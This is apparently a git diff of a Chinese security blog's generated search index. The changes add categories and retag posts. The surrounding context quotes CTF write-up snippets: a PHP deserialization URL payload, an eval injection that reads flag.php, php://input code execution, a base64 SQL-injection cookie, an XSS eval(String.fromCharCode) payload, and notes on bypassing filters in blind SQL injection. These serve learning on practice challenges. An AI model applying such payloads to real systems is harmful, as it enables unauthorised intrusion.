class="comment">#随机数命名图片</span></div><div class="line">    b = str( b )</div><div class="line">    <span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">in</span> each:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">print</span> each</div><div class="line">    pic = requests.get( each )</div><div class="line">    fp = open( b + <span class="string">'.jpg'</span>, <span class="string">'wb'</span> ) <span class="comment">#创建图片文件</span></div><div class="line">    fp.write( pic.content )  <span class="comment">#写入数据</span></div><div class="line"><span class="keyword">print</span> <span class="string">"OK"</span></div></pre></td></tr></table></figure>
 ]]></content>
       
+        <categories>
+            
+            <category> Python </category>
+            
+        </categories>
+        
         
         <tags>
             
-            <tag> Python </tag>
+            <tag> 爬虫 </tag>
             
         </tags>
         
@@ -673,6 +781,12 @@ unserialize：在适当的时候将字符串转化为原来的变量
 <p>生成<code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code>序列化之前应该是一个shield对象中file=pctf.php，通过序列化生成一串字符串，便于传输和保存</p>
 ]]></content>
       
+        <categories>
+            
+            <category> 代码审计 </category>
+            
+        </categories>
+        
         
         <tags>
             
@@ -699,10 +813,14 @@ unserialize ： 对单一的已序列化的变量进行操作，将其转换回 
 <pre><code>http://web.jarvisoj.com:32768/?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}
 </code></pre>]]></content>
       
+        <categories>
+            
+            <category> CTF </category>
+            
+        </categories>
+        
         
         <tags>
-            
-            <tag> CTF </tag>
             
             <tag> PHP序列化 </tag>
             
@@ -730,10 +848,16 @@ unserialize ： 对单一的已序列化的变量进行操作，将其转换回 
 <p>发现失败了，后来看了大佬的write up才发现前面多了一个E。。。解开之后利用<code>binwalk -e</code><br><img src="http://p1.bqimg.com/567571/ac0119c72d4ee393.png" alt=""><br>提取文件然后<code>cat *</code>查找下password得到密码打开压缩包获得flag<br><img src="http://i1.piimg.com/567571/f772dc1795c208e3.png" alt=""></p>
 ]]></content>
       
+        <categories>
+            
+            <category> CTF </category>
+            
+        </categories>
+        
         
         <tags>
             
-            <tag> CTF </tag>
+            <tag> Write-up </tag>
             
         </tags>
         
@@ -792,10 +916,16 @@ eval(&quot;var_dump();echo `cat flag.php`;//);&quot;);
 <p>很明显的文件包含漏洞，在查看PHPinfo时发现<br><img src="http://i1.piimg.com/567571/ad6ff750d73df4bc.png" alt=""><br>那么就可以利用php://input进行代码执行<br><img src="http://p1.bqimg.com/567571/344b6ecdf4830adc.png" alt=""><br>然后<code>cat dle345aae.php</code>得到flag</p>
 ]]></content>
       
+        <categories>
+            
+            <category> CTF </category>
+            
+        </categories>
+        
         
         <tags>
             
-            <tag> CTF </tag>
+            <tag> Write-up </tag>
             
         </tags>
         
@@ -821,6 +951,12 @@ mysql_close($link);
 </code></pre><p>如果出现乱码在配置文件sudo gedit /etc/apache2/apache2.conf&amp;添加如下代码：AddDefaultCharset UTF-8加上这句后重新启动apache2服务，生效。</p>
 ]]></content>
       
+        <categories>
+            
+            <category> Linux </category>
+            
+        </categories>
+        
         
         <tags>
             
@@ -841,6 +977,12 @@ sql注入 XSS什么的也都要靠自己平时的积累。
 </code></pre><p>　　自己文笔还是差的要死，毕竟高中语文都是不及格。<br>　　后排艾特碧连天小队队员@咯咯@c-m要一起努力呀！</p>
 ]]></content>
       
+        <categories>
+            
+            <category> 总结 </category>
+            
+        </categories>
+        
         
         <tags>
             
@@ -911,10 +1053,14 @@ print example
 <h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><h3 id="RESTFUL"><a href="#RESTFUL" class="headerlink" title="RESTFUL"></a>RESTFUL</h3><p>通过F12可以查看到有一个XHR请求flag然后根据回显信息利用PUT型请求以及restful格式的参数赋值得到flag。<br>XHR必须要有<code>X-Requested-With:XMLHttpRequest</code>请求信息<br><img src="http://i1.piimg.com/567571/ad8a7745aea3f09f.png" alt=""></p>
 ]]></content>
       
+        <categories>
+            
+            <category> CTF </category>
+            
+        </categories>
+        
         
         <tags>
-            
-            <tag> CTF </tag>
             
             <tag> 总结 </tag>
             
@@ -1258,10 +1404,16 @@ for i in range(26):
 <h3 id="wireshark-2"><a href="#wireshark-2" class="headerlink" title="wireshark 2"></a>wireshark 2</h3><p>通过追踪TCP流发现有一个压缩包里面有flag.txt文件那么放在kali里面用foremost命令提取一下得到一个压缩包，但是有密码打不开，那么用记事本打开流量包搜索一下pass看是否有密码，然后得到了压缩包的密码，打开得到flag</p>
 ]]></content>
       
+        <categories>
+            
+            <category> CTF </category>
+            
+        </categories>
+        
         
         <tags>
             
-            <tag> CTF </tag>
+            <tag> Write-up </tag>
             
         </tags>
         
@@ -1302,12 +1454,16 @@ Referer：代表当前访问URL的上一个URL
 Cookie：一段文本，常用来表示请求者的身份
 </code></pre>]]></content>
       
+        <categories>
+            
+            <category> 读书笔记 </category>
+            
+        </categories>
+        
         
         <tags>
             
             <tag> HTTP </tag>
-            
-            <tag> 读书笔记 </tag>
             
         </tags>
         
@@ -1393,6 +1549,12 @@ Cookie: uname=MSIgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSxAQHZlcnNpb24gIw==
 如果说Cookie机制是通过检查客户身上的“通行证”来确定客户身份的话，那么Session机制就是通过检查服务器上的“客户明细表”来确认客户身份。Session相当于程序在服务器上建立的一份客户档案，客户来访的时候只需要查询客户档案表就可以了。
 </code></pre>]]></content>
       
+        <categories>
+            
+            <category> Web安全 </category>
+            
+        </categories>
+        
         
         <tags>
             
@@ -1693,10 +1855,16 @@ print s
 <pre><code>&lt;body onload=”eval(Sting.fromCharCode(编码后的东西))”&gt;&lt;/body&gt;
 </code></pre><h2 id="打这个比赛最要感谢的人就是RcoIl啦，从他那里学到了好多我之前都不知道的东西，syc给我最大的礼物就是认识了你，顺便说下-The-dream-is-to-be-realized"><a href="#打这个比赛最要感谢的人就是RcoIl啦，从他那里学到了好多我之前都不知道的东西，syc给我最大的礼物就是认识了你，顺便说下-The-dream-is-to-be-realized" class="headerlink" title="打这个比赛最要感谢的人就是RcoIl啦，从他那里学到了好多我之前都不知道的东西，syc给我最大的礼物就是认识了你，顺便说下 The dream is to be realized"></a>打这个比赛最要感谢的人就是RcoIl啦，从他那里学到了好多我之前都不知道的东西，syc给我最大的礼物就是认识了你，顺便说下 The dream is to be realized</h2>]]></content>
       
+        <categories>
+            
+            <category> CTF </category>
+            
+        </categories>
+        
         
         <tags>
             
-            <tag> CTF </tag>
+            <tag> Write-up </tag>
             
         </tags>
         
@@ -1719,6 +1887,12 @@ print s
 <p>后续遇到的会进行补充</p>
 ]]></content>
       
+        <categories>
+            
+            <category> Web安全 </category>
+            
+        </categories>
+        
         
         <tags>
             
@@ -1747,6 +1921,12 @@ print s
 </code></pre><h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><pre><code>解决方案：在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。
 </code></pre><h2 id="后续遇到的会进行补充"><a href="#后续遇到的会进行补充" class="headerlink" title="后续遇到的会进行补充"></a>后续遇到的会进行补充</h2>]]></content>
       
+        <categories>
+            
+            <category> Web安全 </category>
+            
+        </categories>
+        
         
         <tags>
             
@@ -1800,10 +1980,14 @@ if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个
 <h3 id="post类的布尔盲注与时间盲注"><a href="#post类的布尔盲注与时间盲注" class="headerlink" title="post类的布尔盲注与时间盲注"></a>post类的布尔盲注与时间盲注</h3><p>　　前面说的都是get类的盲注，post类的布尔盲注只是把and换成or其他不变，时间盲注有些不同因为在post类里sleep函数会被放大很多也就是说那个延时时间会很长，不过并不影响我们进行测试。</p>
 ]]></content>
       
+        <categories>
+            
+            <category> Web安全 </category>
+            
+        </categories>
+        
         
         <tags>
-            
-            <tag> CTF </tag>
             
             <tag> SQL </tag>
             
